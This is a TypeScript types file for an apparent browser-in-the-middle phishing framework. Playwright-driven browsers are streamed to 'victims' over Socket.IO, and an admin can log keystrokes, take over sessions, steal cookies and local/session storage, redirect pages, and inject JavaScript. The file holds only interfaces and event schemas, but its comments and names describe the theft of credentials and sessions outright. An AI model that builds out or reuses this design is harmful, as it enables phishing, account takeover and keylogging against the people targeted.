import type { Socket } from 'socket.io';

// ─── Config schemas ───────────────────────────────────────────────────────────

export interface Config {
  default_user_agent: string;
  socket_key: string;
  admin_ips: string[];
  proxy: string | null;
}

export interface Target {
  name: string;
  url: string;
  width: number;
  height: number;
  inject_js?: string;
}

// ─── Browser instance ─────────────────────────────────────────────────────────

export interface BrowserInstance {
  id: string;
  /** Socket.IO socket ID of the victim connection */
  victimSocket: string | null;
  /** Socket.IO socket ID of the admin taking over */
  controllerSocket: string | null;
  /** Target site configuration (set at claim time) */
  target: Target | null;
  /** Mutable frame callback — swap to reroute without restarting screencast */
  onFrame: (buf: Buffer) => void;
  /** Scale factors computed at claim time (target.width / victimViewportWidth) */
  scaleX: number;
  scaleY: number;
  /** Underlying Playwright browser context */
  context: import('playwright').BrowserContext;
  /** Active page */
  page: import('playwright').Page;
  /** CDP session for screencast */
  cdpSession: import('playwright').CDPSession | null;
  /** Timestamp when victim connected */
  connectedAt: Date | null;
  /** Whether the browser is currently claimed by a victim */
  claimed: boolean;
  /** Accumulated keystroke log for this session */
  keylog: string;
}

// ─── Socket.IO event maps ──────────────────────────────────────────────────────

/** Events sent from client (victim or admin) → server */
export interface ClientToServerEvents {
  /** Victim: announce self, receive a browser session */
  new_phish: (data: NewPhishPayload) => void;
  /** Victim/Admin: mouse move */
  mouse_move: (data: MousePayload) => void;
  /** Victim/Admin: mouse click */
  mouse_click: (data: MouseClickPayload) => void;
  /** Victim/Admin: mouse scroll */
  mouse_scroll: (data: MouseScrollPayload) => void;
  /** Victim/Admin: key down */
  key_down: (data: KeyPayload) => void;
  /** Victim/Admin: key up */
  key_up: (data: KeyPayload) => void;
  /** Victim/Admin: paste text */
  paste: (data: PastePayload) => void;
  /** Admin: steal cookies from active session */
  get_cookies: (data: { browserId: string }) => void;
  /** Admin: steal localStorage from active session */
  get_storage: (data: { browserId: string }) => void;
  /** Admin: take over victim's browser view */
  take_over_browser: (data: TakeoverPayload) => void;
  /** Admin: return control to victim */
  give_back_control: () => void;
  /** Admin: navigate victim browser to URL */
  navigate: (data: NavigatePayload) => void;
  /** Admin: inject JS into victim page */
  inject_js: (data: InjectPayload) => void;
}

/** Events sent from server → client */
export interface ServerToClientEvents {
  /** JPEG frame buffer */
  frame: (data: Buffer) => void;
  /** Thumbnail JPEG for admin list (every Nth frame) */
  thumbnail: (data: ThumbnailPayload) => void;
  /** Cookie extraction result */
  cookies: (data: CookiePayload) => void;
  /** localStorage extraction result */
  storage: (data: StoragePayload) => void;
  /** Notification that admin has taken over */
  taken_over: () => void;
  /** Notification that control returned to victim */
  control_returned: () => void;
  /** Error message */
  error: (message: string) => void;
  /** New victim connected — admin notification */
  new_victim: (data: VictimInfo) => void;
  /** Victim disconnected — admin notification */
  victim_disconnected: (data: { browserId: string }) => void;
  /** List of active victims (sent on admin connect) */
  victim_list: (data: VictimInfo[]) => void;
  /** Real-time keystroke entry from a victim */
  keylog: (data: KeylogPayload) => void;
  /** Page title + favicon URL, sent after each navigation */
  page_meta: (data: PageMetaPayload) => void;
}

/** Per-socket server state */
export interface SocketData {
  isAdmin: boolean;
  browserId?: string;
}

// ─── Event payload types ───────────────────────────────────────────────────────

export interface NewPhishPayload {
  /** Victim's viewport width */
  width: number;
  /** Victim's viewport height */
  height: number;
  /** Target key from targets.json */
  target: string;
}

export interface MousePayload {
  x: number;
  y: number;
}

export interface MouseClickPayload {
  x: number;
  y: number;
  button: 'left' | 'right' | 'middle';
}

export interface MouseScrollPayload {
  x: number;
  y: number;
  deltaX: number;
  deltaY: number;
}

export interface KeyPayload {
  key: string;
  code: string;
}

export interface PastePayload {
  text: string;
}

export interface TakeoverPayload {
  browserId: string;
}

export interface NavigatePayload {
  url: string;
}

export interface InjectPayload {
  js: string;
}

export interface ThumbnailPayload {
  browserId: string;
  data: Buffer;
}

export interface CookiePayload {
  browserId: string;
  cookies: SerializedCookie[];
}

export interface StoragePayload {
  browserId: string;
  localStorage: Record<string, string>;
  sessionStorage: Record<string, string>;
}

export interface VictimInfo {
  browserId: string;
  target: string;
  connectedAt: string;
  ip: string;
  keylog: string;
}

export interface KeylogPayload {
  browserId: string;
  entry: string;
}

export interface PageMetaPayload {
  title: string;
  favicon: string;
}

export interface SerializedCookie {
  name: string;
  value: string;
  domain: string;
  path: string;
  expires: number;
  httpOnly: boolean;
  secure: boolean;
  sameSite: 'Strict' | 'Lax' | 'None' | 'no_restriction';
}

// ─── Typed socket alias ────────────────────────────────────────────────────────

export type AppSocket = Socket<
  ClientToServerEvents,
  ServerToClientEvents,
  Record<string, never>,
  SocketData
>;
